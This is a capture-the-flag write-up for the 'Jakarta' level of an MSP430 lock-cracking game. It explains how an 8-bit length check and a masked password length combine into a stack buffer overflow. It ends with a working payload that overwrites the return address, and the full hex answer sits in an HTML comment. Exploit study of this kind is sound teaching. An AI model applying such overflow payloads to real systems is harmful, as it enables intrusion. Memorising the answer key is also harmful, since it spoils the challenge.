# Jakarta
> partial source code is [here](./dump.asm)  
> **Vulnerability**: stack buffer overflow, arithmetic overflow

## Analysis
abstract **pseudo c code** of the function `<login>`:  
(only the relevant part is shown)
```c
void login() {
    gets(0x2402, 0xff);     // get `username`
    int username_len = strlen(0x2402);
    strcpy(sp, 0x2402);
    if (username_len >= 33) {
        exit();
    }
    int max_password_len = (31 - username_len) & 0x1ff;
    gets(0x2402, max_password_len);     // get `password`
    int password_len = strlen(0x2402);
    strcpy(sp + username_len, 0x2402);
    if (username_len + password_len >= 33) {
        exit();
    }
    // @ 0x4612
    if (test_username_and_password_valid(sp)) {
        unlock_door();
        puts("Access granted.");
    } else {
        puts("The password is not correct.");
    }
}
```

### Vulnerability
1. arithmetic overflow
    - test for the total length of `username` and `password`
        ```asm
        4600:  7f90 2100      cmp.b	#0x21, r15              ; r15 = username_len + password_len
        4604:  0628           jnc	$+0xe <login+0xb2>
        ```
        The comparison only checks for the lower 8 bits of `r15` with `0x21`
        Therefore, if `username_len + password_len` is greater than `0x100` and keep the lower byte less than `0x21`, then the comparison will pass while taking in a large chunk of data on the stack.

        ***Solution Restriction 1***: $0x100 \leq username\_length + password\_length \lt 0x121$
2. Wrong arithmetic calculation
    In order for the ***Solution Restriction 1*** to work, we need either one or both of `username` and `password` to be long enough. However, the program also have some boundary check for both `username` and `password`:
    1. `username` length checks
        The program will be able to get input of length up to `0xff` bytes but it has a boundary check for `username` length that if it is greater than `0x20`, then the program will exit.

        ***Solution Restriction 2***: $username\_length \leq 0x20$
    2. `password` length restriction
        The number of bytes that can be read for `password` is calculated as follows:
        ```c
        int max_password_len = (31 - username_len) & 0x1ff;
        ```

        At first glance, due to the subtraction, it seems that the maximum length of two inputs is **31**. However, because of the `& 0x1ff`, the length for `password` is as follows:
        |         `username` length         |              `password` length               |
        | :-------------------------------: | :------------------------------------------: |
        |                 0                 |                      31                      |
        |                 1                 |                      30                      |
        |                 2                 |                      29                      |
        |                ...                |                     ...                      |
        |                30                 |                      1                       |
        |                31                 |                      0                       |
        | <span style="color:red">32</span> | <span style="color:red">0x1ff (= 511)</span> |

        That is, as long as the `username` length is exactly **32**, then the `password` length can be **511** bytes and will be able to fulfill the ***Solution Restriction 1***.

        ***Solution Restriction 3***: $username\_length == 0x20$ and $password\_length \leq 0x1ff$
3. stack buffer overflow  
   Combine all the previous vulnerabilities, the password can be extremely long and will **possibly** be able to overflow the stack.

   But how does the stack look like?
   - Stack Layout
        ```asm
        4560:  0b12           push	r11
        4558:  3150 d8ff      add	#0xffde, sp     ; sp = sp - 0x22
        ```
        From `sp` to return address of `<login>` is `0x22 + 0x2 = 0x24` bytes.

        Where is `username` and `password` stored?
        ```asm
        ; username
        45a4:  3e40 0224      mov	#0x2402, r14
        45a8:  0f41           mov	sp, r15
        45aa:  b012 f446      call	#0x46f4 <strcpy>            ; strcpy(sp, 0x2402)
        ...
        ; password
        45e2:  3e40 0224      mov	#0x2402, r14
        45e6:  0f41           mov	sp, r15                     ; r15 = sp
        45e8:  0f5b           add	r11, r15                    ; r15 = sp + strlen(username)
        45ea:  b012 f446      call	#0x46f4 <strcpy>            ; strcpy(sp + strlen(username), 0x2402)
        ```

        Therefore, `username` is at the beginning of the stack and with ***Restriction 3*** where `username_length == 0x20`, `password` will be stored at `sp + 0x20`.

        That is, the stack layout from the `password`'s point of view is as follows:
        |            |   `password`   |
        | :--------: | :------------: |
        | sp + 0x20  |   (padding)    |
        | sp + 0x22  |   (padding)    |
        | sp + 0x24  | return address |
        | sp + 0x26  |   (padding)    |
        |    ...     |      ...       |
        | sp + 0xfe  |   (padding)    |
        | sp + 0x100 |   (padding)    |

        ***Solution Restriction 4***: `password` needs padding of 4 bytes, address of `<unlock_door>`, 0x444c in little endian, and padding such that the total length of `username` and `password` is at least 0x101 and no more than 0x120 (minimun padding of 218).


## Exploit
Combine all the ***Solution Restrictions***, the following input will be able to unlock the door:
|        username         |                                             password                                             |
| :---------------------: | :----------------------------------------------------------------------------------------------: |
| (0x20 bytes of padding) | (0x4 bytes of padding) + 2 bytes of address to function `<unlock_door>` + (218 bytes of padding) |


<!-- solution: {'level_id': 11, 'input': '4141414141414141414141414141414141414141414141414141414141414141;616161614c446262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262;'} -->
